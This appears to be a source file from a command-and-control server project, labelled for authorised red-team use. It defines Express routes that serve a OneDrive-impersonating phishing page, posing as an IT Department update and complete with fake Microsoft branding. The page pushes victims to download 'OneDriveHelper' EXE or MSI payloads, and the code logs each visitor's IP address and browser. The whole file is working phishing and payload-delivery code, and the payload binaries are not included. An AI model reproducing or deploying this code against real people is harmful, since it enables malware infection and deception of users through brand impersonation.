"use strict";

/**
 * Phishing / payload delivery routes — for authorised red-team / security
 * awareness testing ONLY.
 *
 * Place built payloads in:
 *   c2-server/downloads/OneDriveHelper.exe
 *   c2-server/downloads/OneDriveHelper.msi
 *
 * Routes:
 *   GET /install       → phishing landing page (OneDrive-themed)
 *   GET /dl/exe        → serve EXE with download logging
 *   GET /dl/msi        → serve MSI with download logging
 *   GET /dl/log        → view access log (admin-only)
 */

const express = require("express");
const path    = require("path");
const fs      = require("fs");
const { adminAuthed } = require("../middleware/auth");

const router       = express.Router();
const DOWNLOADS    = path.join(__dirname, "..", "downloads");
const ACCESS_LOG   = path.join(DOWNLOADS, "access.log");

if (!fs.existsSync(DOWNLOADS)) fs.mkdirSync(DOWNLOADS, { recursive: true });

function logAccess(req, label) {
  const ip  = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
  const ua  = req.headers["user-agent"] || "-";
  const ts  = new Date().toISOString();
  const line = `[${ts}] ${label}  ip=${ip}  ua="${ua}"\n`;
  fs.appendFileSync(ACCESS_LOG, line);
  console.log("[phish]", line.trim());
}

// ── Landing page ──────────────────────────────────────────────────────────────

const LANDING_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft OneDrive</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;min-height:100vh}

  /* top bar */
  .topbar{background:#0078d4;display:flex;align-items:center;padding:0 24px;height:48px}
  .topbar-logo{display:flex;align-items:center;gap:8px;color:#fff;font-size:17px;font-weight:600;text-decoration:none}
  .topbar-logo svg{flex-shrink:0}

  /* card wrapper */
  .page{display:flex;flex-direction:column;align-items:center;padding:40px 16px 60px}

  /* sender card */
  .sender-card{background:#fff;border-radius:4px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.11);width:100%;max-width:560px;padding:32px 40px}
  .sender-avatar{width:48px;height:48px;border-radius:50%;background:#0078d4;color:#fff;font-size:20px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
  .sender-row{display:flex;align-items:center;gap:16px;margin-bottom:24px}
  .sender-info h2{font-size:15px;font-weight:600;color:#201f1e}
  .sender-info p{font-size:13px;color:#605e5c;margin-top:2px}
  .divider{border:none;border-top:1px solid #edebe9;margin-bottom:22px}

  .file-row{display:flex;align-items:center;gap:14px;margin-bottom:28px}
  .file-icon{width:44px;height:44px;flex-shrink:0}
  .file-meta h3{font-size:14px;font-weight:600;color:#201f1e}
  .file-meta p{font-size:12px;color:#605e5c;margin-top:3px}

  .msg-box{background:#f3f2f1;border-radius:4px;padding:14px 16px;margin-bottom:28px;font-size:13px;color:#323130;line-height:1.5}

  /* download buttons */
  .btn-group{display:flex;flex-direction:column;gap:10px}
  .btn{display:flex;align-items:center;justify-content:center;gap:10px;border-radius:4px;font-size:14px;font-weight:600;padding:11px 20px;cursor:pointer;text-decoration:none;transition:filter .15s}
  .btn:hover{filter:brightness(.92)}
  .btn-primary{background:#0078d4;color:#fff;border:none}
  .btn-secondary{background:#fff;color:#0078d4;border:2px solid #0078d4}
  .btn svg{flex-shrink:0}

  .footnote{margin-top:20px;font-size:11px;color:#a19f9d;text-align:center;max-width:560px}

  /* security notice strip */
  .notice{background:#fff4ce;border:1px solid #fce100;border-radius:4px;display:flex;gap:12px;align-items:flex-start;padding:12px 16px;max-width:560px;width:100%;margin-top:20px}
  .notice svg{flex-shrink:0;margin-top:1px}
  .notice p{font-size:12px;color:#323130;line-height:1.5}
  .notice strong{font-weight:600}
</style>
</head>
<body>

<div class="topbar">
  <a class="topbar-logo" href="#">
    <!-- OneDrive cloud icon -->
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M20.5 13.5A4.5 4.5 0 0 0 16.17 8a6 6 0 0 0-11.7 2.05A4 4 0 0 0 4 18h16.5a3 3 0 0 0 0-6h-.23A4.5 4.5 0 0 0 20.5 13.5Z" fill="white"/>
    </svg>
    OneDrive
  </a>
</div>

<div class="page">

  <div class="sender-card">
    <div class="sender-row">
      <div class="sender-avatar">IT</div>
      <div class="sender-info">
        <h2>IT Department</h2>
        <p>Shared a file with you &middot; <span id="ts"></span></p>
      </div>
    </div>
    <hr class="divider">

    <div class="file-row">
      <!-- package/installer icon -->
      <svg class="file-icon" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="44" height="44" rx="4" fill="#0078d4"/>
        <path d="M12 14h20v22H12V14zm4 4v2h12v-2H16zm0 4v2h12v-2H16zm0 4v2h8v-2h-8z" fill="white" opacity=".9"/>
      </svg>
      <div class="file-meta">
        <h3>OneDriveHelper-Setup.exe</h3>
        <p>Windows Installer &mdash; required for OneDrive sync</p>
      </div>
    </div>

    <div class="msg-box">
      Your IT department has shared a required update for the OneDrive desktop
      client. Please download and run the installer to ensure your files stay
      in sync. <strong>Both options below install the same update</strong> — use
      the MSI package if prompted by your organisation&rsquo;s software deployment policy.
    </div>

    <div class="btn-group">
      <a class="btn btn-primary" href="/dl/exe">
        <!-- download icon -->
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 16l-5-5h3V4h4v7h3l-5 5z" fill="white"/>
          <path d="M5 18h14v2H5v-2z" fill="white"/>
        </svg>
        Download EXE &nbsp;&middot;&nbsp; Recommended
      </a>
      <a class="btn btn-secondary" href="/dl/msi">
        <!-- package icon -->
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M20 7H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1z" stroke="#0078d4" stroke-width="1.8" fill="none"/>
          <path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2" stroke="#0078d4" stroke-width="1.8" fill="none"/>
        </svg>
        Download MSI &nbsp;&middot;&nbsp; Enterprise / Group Policy
      </a>
    </div>
  </div>

  <div class="notice">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="12" cy="12" r="10" stroke="#fce100" stroke-width="2" fill="#fce100"/>
      <path d="M12 7v6" stroke="#333" stroke-width="2" stroke-linecap="round"/>
      <circle cx="12" cy="16.5" r="1" fill="#333"/>
    </svg>
    <p><strong>Security tip:</strong> Only run software shared through official IT channels. If you did not
       expect this installer, contact your IT helpdesk before downloading.</p>
  </div>

  <p class="footnote">
    &copy; Microsoft Corporation &nbsp;&bull;&nbsp; OneDrive for Business
    &nbsp;&bull;&nbsp; <a href="#" style="color:#0078d4;text-decoration:none">Privacy &amp; Cookies</a>
  </p>

</div>

<script>
  // Show a human-readable "just now" timestamp
  const el = document.getElementById('ts');
  const now = new Date();
  el.textContent = now.toLocaleDateString(undefined, {month:'short',day:'numeric',year:'numeric'})
    + ' at ' + now.toLocaleTimeString(undefined, {hour:'2-digit',minute:'2-digit'});
</script>
</body>
</html>`;

router.get("/install", (req, res) => {
  logAccess(req, "PAGE_VISIT");
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.send(LANDING_HTML);
});

// ── Payload delivery ──────────────────────────────────────────────────────────

router.get("/dl/exe", (req, res) => {
  const file = path.join(DOWNLOADS, "OneDriveHelper.exe");
  if (!fs.existsSync(file)) {
    return res.status(404).send("File not found — place OneDriveHelper.exe in c2-server/downloads/");
  }
  logAccess(req, "DOWNLOAD_EXE");
  res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
  res.setHeader("Content-Type", "application/octet-stream");
  res.sendFile(file);
});

router.get("/dl/msi", (req, res) => {
  const file = path.join(DOWNLOADS, "OneDriveHelper.msi");
  if (!fs.existsSync(file)) {
    return res.status(404).send("File not found — place OneDriveHelper.msi in c2-server/downloads/");
  }
  logAccess(req, "DOWNLOAD_MSI");
  res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.msi"');
  res.setHeader("Content-Type", "application/x-msi");
  res.sendFile(file);
});

// ── Access log (admin only) ───────────────────────────────────────────────────

router.get("/dl/log", adminAuthed, (req, res) => {
  if (!fs.existsSync(ACCESS_LOG)) return res.send("No downloads yet.");
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(fs.readFileSync(ACCESS_LOG, "utf8"));
});

module.exports = router;
